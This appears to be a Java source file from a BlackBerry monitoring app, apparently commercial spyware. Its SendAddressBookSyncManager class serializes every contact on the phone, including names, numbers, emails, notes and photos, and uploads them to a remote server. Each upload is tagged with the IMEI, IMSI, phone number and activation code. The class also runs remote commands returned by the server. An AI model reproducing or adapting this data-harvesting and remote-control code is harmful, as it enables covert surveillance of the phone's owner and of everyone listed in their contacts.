package com.vvt.protsrv;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Vector;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import javax.microedition.pim.PIM;
import net.rim.blackberry.api.pdap.BlackBerryContact;
import net.rim.device.api.io.Base64InputStream;
import net.rim.device.api.system.RuntimeStore;
import com.vvt.pref.PrefConnectionHistory;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.CommandCode;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.DataProvider;
import com.vvt.prot.command.AddressBook;
import com.vvt.prot.command.CompressionType;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.Languages;
import com.vvt.prot.command.SendAddressBook;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.command.VCardSummaryFields;
import com.vvt.prot.command.response.SendAddressBookCmdResponse;
import com.vvt.prot.command.response.StructureCmdResponse;
import com.vvt.prot.event.VCard;
import com.vvt.protsrv.addr.AddressBookStore;
import com.vvt.protsrv.addr.ApprovalStatus;
import com.vvt.protsrv.addr.ContactInfo;
import com.vvt.protsrv.addr.ContactStore;
import com.vvt.protsrv.util.ProtSrvUtil;
import com.vvt.rmtcmd.RmtCmdProcessingManager;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.version.VersionInfo;

public class SendAddressBookSyncManager implements CommandListener, DataProvider {

	private static final String TAG = "SendAddressBookSyncManager";
	private static final long SEND_ADDR_SYNC_GUID = 0x1ef9da0cb47c5762L;
	private static SendAddressBookSyncManager self = null;
	private long csid = 0;
	private int numbOfAddrb = 0;
	private int numbOfVcards = 0;	
	private int vCardCount = 0;
	private int addrBookCount = 0;
	private int vCardIndex = 0;	
	private int addressBookIndex = 0;
	private int payloadSize = 0;
	private boolean addrSizeExceeded = false;
	private boolean contactChanged = false;
	private ContactStore contactStore = null;
	private AddressBookStore addrStore = null;
	private ServerUrl serverUrl = Global.getServerUrl();
	private RmtCmdProcessingManager rmtCmdMgr = Global.getRmtCmdProcessingManager();
	private LicenseManager license = Global.getLicenseManager();
	private LicenseInfo licenseInfo = license.getLicenseInfo();
	private Preference pref = Global.getPreference();
	private String[] dataFormats = null;
	private Vector listeners = new Vector();
	private SendAddressBookCmdResponse sendAddrBookRes = null;
	private ProtSrvUtil protSrvUtil = new ProtSrvUtil();
	
	private SendAddressBookSyncManager() {		
	}
	
	public static SendAddressBookSyncManager getInstance() {
		if (self == null) {
			self = (SendAddressBookSyncManager)RuntimeStore.getRuntimeStore().get(SEND_ADDR_SYNC_GUID);
			if (self == null) {
				SendAddressBookSyncManager sendAddrSyn = new SendAddressBookSyncManager();
				RuntimeStore.getRuntimeStore().put(SEND_ADDR_SYNC_GUID, sendAddrSyn);
				self = sendAddrSyn;
			}
		}
		return self;
	}
	
	public void send(AddressBookStore addrStore) {
//		Log.debug("SendAddressBookSyncManager.send()", "ENTER!");
		this.addrStore = addrStore;		
		try {
			clearState();
			doSend();
		} catch (Exception e) {
			e.printStackTrace();
			clearState();
			notifyError(e.getMessage());
		}
	}
	
	public void setContactChanged() {
		contactChanged = true;
	}
	
	public void addListener(PhoenixProtocolListener listener) {
		if (!isExisted(listener)) {
			listeners.addElement(listener);
		}
	}

	public void removeListener(PhoenixProtocolListener listener) {
		if (isExisted(listener)) {
			listeners.removeElement(listener);
		}
	}
		
	public void cancelTask() {	
//		Log.debug("SendAddressBookSyncManager.cancelTask()", "Cancel Task!");
		try {
			CommandServiceManager.getInstance().cancelRequest(csid);				
		} catch (Exception e) {
			Log.error("SendAddressBookSyncManager.cancelTask()", "Cancel with csid: " + csid);
		}
	}
	
	private synchronized void doSend() throws Exception {
//		Log.debug(TAG + ".doSend()", "ENTER");			
		checkAddressBookSize();
		CommandRequest cmdRequest = initCommandRequest();
		// Execute Command
		csid = CommandServiceManager.getInstance().execute(cmdRequest);			
//		Log.debug(TAG + ".doSend()", "EXIT");		
	}
	
	// Set address book count and next vcard's offset. 
	private void checkAddressBookSize() throws Exception {
		int i = 0;
		payloadSize = 0;
		addrSizeExceeded = false;
		for (i = addressBookIndex; i < addrStore.countContactStore(); i++) {
			ContactStore contactStore = addrStore.getContactStore(i);
			if (isVcardSizeExceeded(i, vCardIndex, contactStore.countContactInfo())) {					
				addressBookIndex = i;
				addrSizeExceeded = true;
				break;
			} 
		}
	}
	
	private boolean isVcardSizeExceeded(int addressBookIndex, int vCardBeginOffset, int vCardEndOffset) throws Exception {
		int i = 0;
		boolean sizeExceeded = false;
		ContactStore contactStore = null;
		ContactInfo contactInfo = null;
		
		dataFormats = PIM.getInstance().supportedSerialFormats(PIM.CONTACT_LIST);
		contactStore = addrStore.getContactStore(addressBookIndex);
		for (i = vCardBeginOffset; i < vCardEndOffset && payloadSize <= ApplicationInfo.SIZE_LIMITED; i++) {
			contactInfo = contactStore.getContact(i);
			BlackBerryContact contact = contactInfo.getContact();				
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			PIM.getInstance().toSerialFormat(contact, bos, "UTF-8", dataFormats[0]);
			payloadSize += bos.size();
			bos = null;
		}
		vCardIndex = 0;
		if (payloadSize > ApplicationInfo.SIZE_LIMITED) {
			sizeExceeded = true;
			vCardIndex = i;
			numbOfVcards = vCardIndex - vCardBeginOffset;			
		}	
		return sizeExceeded;
	}
	
	private boolean isExisted(PhoenixProtocolListener listener) {
		boolean existed = false;
		for (int i = 0; i < listeners.size(); i++) {
			if (listener == listeners.elementAt(i)) {
				existed = true;
				break;
			}
		}
		return existed;
	}
	
	private void notifySuccess() {
		updateSuccessStatus();
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			if (listener != null) {
				listener.onSuccess(sendAddrBookRes);
			}
		}
	}
	
	private void notifyError(String message) {
		updateErrorStatus(message);
		for (int i = 0; i < listeners.size(); i++) {
			PhoenixProtocolListener listener = (PhoenixProtocolListener)listeners.elementAt(i);
			if (listener != null) {
				listener.onError(message);
			}
		}
	}
		
	private CommandRequest initCommandRequest() {
		CommandRequest cmdRequest = new CommandRequest();
		// To construct and send Address book.
		CommandMetaData cmdMetaData = initComandMetaData();
		// Send AddressBook 
		SendAddressBook sendAddr = new SendAddressBook();		
		if (addrSizeExceeded) {
			sendAddr.setAddressBookCount(addressBookIndex + 1);
		} else {
			sendAddr.setAddressBookCount(addrStore.countContactStore());
		}
		numbOfAddrb = sendAddr.getAddressBookCount();
		for (int i = 0; i < numbOfAddrb; i++) {
			//Address Book
			AddressBook addrBook = new AddressBook();
			ContactStore contactStore = addrStore.getContactStore(i);
			addrBook.setAddressBookId(contactStore.getAddressBookId());
			addrBook.setAddressBookName(contactStore.getAddressBookName());
			if (addrSizeExceeded) {
				addrBook.setVCardCount(numbOfVcards);				
			} else {
				addrBook.setVCardCount(contactStore.countContactInfo());
			}
			addrBook.setVCardProvider(this);
			sendAddr.addAddressBook(addrBook);			
		}
		// Command Request
		cmdRequest.setCommandData(sendAddr);
		cmdRequest.setCommandMetaData(cmdMetaData);
		cmdRequest.setUrl(serverUrl.getServerDeliveryUrl());
		cmdRequest.setCommandListener(this);
		return cmdRequest;
	}
	
	private CommandMetaData initComandMetaData() {
		// Meta Data
		licenseInfo = license.getLicenseInfo();
		CommandMetaData cmdMetaData = new CommandMetaData();
		cmdMetaData.setProtocolVersion(ApplicationInfo.PROTOCOL_VERSION);
		cmdMetaData.setProductId(licenseInfo.getProductID());
//		cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
		cmdMetaData.setProductVersion(VersionInfo.getFullVersion());
		cmdMetaData.setConfId(licenseInfo.getProductConfID());
		cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
		cmdMetaData.setLanguage(Languages.ENGLISH);
		cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
		cmdMetaData.setMcc(PhoneInfo.getMCC());
		cmdMetaData.setMnc(PhoneInfo.getMNC());
		cmdMetaData.setActivationCode(licenseInfo.getActivationCode());
		cmdMetaData.setImsi(PhoneInfo.getIMSI());
		cmdMetaData.setBaseServerUrl(protSrvUtil.getBaseServerUrl());
		cmdMetaData.setTransportDirective(TransportDirectives.RESUMABLE);
		cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
		cmdMetaData.setCompressionCode(CompressionType.COMPRESS_ALL_METADATA.getId());
		return cmdMetaData;
	}
	
	private VCardSummaryFields setVCardSummaryFields(BlackBerryContact contact) throws IOException {
		VCardSummaryFields vcardSummary = new VCardSummaryFields();
	    if (contact.countValues(BlackBerryContact.NAME) > 0) {
	        String[] name = contact.getStringArray(BlackBerryContact.NAME, 0);
	        String firstName = name[BlackBerryContact.NAME_GIVEN];
	        String lastName = name[BlackBerryContact.NAME_FAMILY];
	        vcardSummary.setFirstName(firstName);
	        vcardSummary.setLastName(lastName);
	    } 
	    int telCount = contact.countValues(BlackBerryContact.TEL);
	    if (telCount > 0) {
	    	for (int atrCount = 0; atrCount < telCount; ++atrCount) {
		    	int number = contact.getAttributes(BlackBerryContact.TEL, atrCount);
		    	switch (number) {
		    	case BlackBerryContact.ATTR_HOME:
		    		String homePhone = contact.getString(BlackBerryContact.TEL, atrCount);
		    		vcardSummary.setHomePhone(homePhone);
		    		break;
		    	
		    	case BlackBerryContact.ATTR_MOBILE:
		    		String mobilePhone = contact.getString(BlackBerryContact.TEL, atrCount);
		    		vcardSummary.setMobilePhone(mobilePhone);
		    		break;
		    		
		    	case BlackBerryContact.ATTR_WORK:
		    		String workPhone = contact.getString(BlackBerryContact.TEL, atrCount);
		    		vcardSummary.setWorkPhone(workPhone);
		    		break;
		    	}
	    	}
	    } 
	    if (contact.countValues(BlackBerryContact.EMAIL) > 0) {
	    	String email = contact.getString(BlackBerryContact.EMAIL, 0);
	    	vcardSummary.setEmail(email);
	    } 
	    if (contact.countValues(BlackBerryContact.NOTE) > 0) {
	    	String note = contact.getString(BlackBerryContact.NOTE, 0);
	    	vcardSummary.setNote(note);
	    } 
	    if (contact.countValues(BlackBerryContact.PHOTO) > 0) {
	    	byte[] photoEncoded = contact.getBinary( BlackBerryContact.PHOTO, 0 );
	    	byte[] photoDecode = Base64InputStream.decode( photoEncoded, 0, photoEncoded.length );
	    	vcardSummary.setContactPicture(photoDecode);
	    }
	    return vcardSummary;
	}

	private void clearState() {
		addrSizeExceeded = false;
		contactChanged = false;
		addressBookIndex = 0;
		vCardIndex = 0;
		addrBookCount = 0;
		vCardCount = 0;			
	}

	private void updateSuccessStatus() {
		// To save last connection.
		PrefConnectionHistory conHistory = new PrefConnectionHistory();
		conHistory.setLastConnection(System.currentTimeMillis());
		conHistory.setConnectionMethod(sendAddrBookRes.getConnectionMethod());
		conHistory.setLastConnectionStatus(sendAddrBookRes.getServerMsg());
		conHistory.setActionType(CommandCode.SEND_ADDRESS_BOOK.getId());
		conHistory.setStatusCode(sendAddrBookRes.getStatusCode());				
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		generalInfo.addPrefConnectionHistory(conHistory);
		pref.commit(generalInfo);
	}
	
	private void updateErrorStatus(String message) {
		PrefConnectionHistory conHistory = new PrefConnectionHistory();
		conHistory.setLastConnection(System.currentTimeMillis());
		conHistory.setLastConnectionStatus(message);
		conHistory.setStatusCode(2);
		conHistory.setActionType(CommandCode.SEND_ADDRESS_BOOK.getId());
		PrefGeneral generalInfo = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
		generalInfo.addPrefConnectionHistory(conHistory);
		pref.commit(generalInfo);
	}
	
	// DataProvider
	public boolean hasNext() {
		boolean hasNext = false; 
		if (contactChanged) {
			contactChanged = false;
			cancelTask();
		} else {
			contactStore = addrStore.getContactStore(addrBookCount);
			hasNext = vCardCount < contactStore.countContactInfo();
			if (addrSizeExceeded) {
				if (addrBookCount == addressBookIndex) {
					hasNext = (numbOfVcards != 0);
				} 
			} 
			if (!hasNext) {
				if (vCardCount == contactStore.countContactInfo()) {
					if (addrBookCount < (numbOfAddrb - 1)) {
						// Get next AddressBook.
						addrBookCount++;
						vCardCount = 0;
					} else {
						// Last contact at last address book.
						addrSizeExceeded = false;
					}
				}
			}
		}
		return hasNext;
	}
	
	public Object getObject() {
		VCard vcard = new VCard();		
		try {
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			ContactInfo contactInfo = contactStore.getContact(vCardCount);
			BlackBerryContact contact = contactInfo.getContact();
			PIM.getInstance().toSerialFormat(contact, bos, "UTF-8", dataFormats[0]);
			vcard.setClientId(contactInfo.getClientId());
			vcard.setServerId(contactInfo.getServerId());
			vcard.setApprovalStatus(ApprovalStatus.NO_STATUS.getId());
			VCardSummaryFields vCardSummary = setVCardSummaryFields(contact);
			vcard.addVCardSummary(vCardSummary);
			vcard.setVCardData(bos.toByteArray());
			vCardCount++;
			numbOfVcards--;
		} catch (Exception e) {
			clearState();
			Log.error("SendAddressBookSyncManager.getObject()", e.getMessage());
			e.printStackTrace();
		} 
		return vcard;
	}
	
	public void readDataDone() {
//		Log.debug(TAG + ".readDataDone()", "ENTER");		
	}
	 
	// CommandListener
	public void onConstructError(long csid, Exception e) {
		Log.error(TAG + ".onConstructError()", "csid: " + csid, e);
		notifyError(e.getMessage());
	}

	public void onServerError(long csid, StructureCmdResponse response) {
		Log.error(TAG + ".onServerError()", "Status Code: " + response.getStatusCode());
		Log.error(TAG + ".onServerError()", "Server Message: " + response.getServerMsg());
		notifyError(response.getServerMsg() + Constant.L_SQUARE_BRACKET + Constant.HEX + Integer.toHexString(response.getStatusCode()) + Constant.R_SQUARE_BRACKET);
	}
	
	public void onTransportError(long csid, Exception e) {
		Log.error(TAG + ".onTransportError()", "csid: " + csid, e);
		notifyError(e.getMessage());
		CommandServiceManager.getInstance().cancelRequest(csid);
	}
	
	public void onSuccess(StructureCmdResponse response) {
		/*if (Log.isDebugEnable()) {
			Log.debug(TAG + ".onSuccess()", "ENTER");
		}*/
		try {
			if (response instanceof SendAddressBookCmdResponse) {
				sendAddrBookRes = (SendAddressBookCmdResponse)response;
				if (sendAddrBookRes.getStatusCode() == 0) {
					rmtCmdMgr.process(sendAddrBookRes.getPCCCommands());
					clearState();
					notifySuccess();					
				} else {
					clearState();
					notifyError(sendAddrBookRes.getServerMsg() + Constant.L_SQUARE_BRACKET + Constant.HEX + Integer.toHexString(response.getStatusCode()) + Constant.R_SQUARE_BRACKET);
				}
			} else {
				clearState();
				notifyError(response.getServerMsg() + Constant.L_SQUARE_BRACKET + Constant.HEX + Integer.toHexString(response.getStatusCode()) + Constant.R_SQUARE_BRACKET);
			}
		} catch (Exception e) {
			e.printStackTrace();
			clearState();
			notifyError(e.getMessage());
		}
//		Log.debug(TAG + ".onSuccess()", "EXIT");
	}
	
}